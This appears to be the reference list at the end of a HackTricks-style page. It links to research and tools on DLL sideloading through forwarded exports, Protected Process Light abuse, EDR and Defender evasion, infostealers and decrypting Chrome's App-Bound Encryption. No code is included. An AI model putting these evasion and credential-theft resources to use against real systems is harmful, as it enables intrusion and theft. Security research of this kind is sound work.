- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
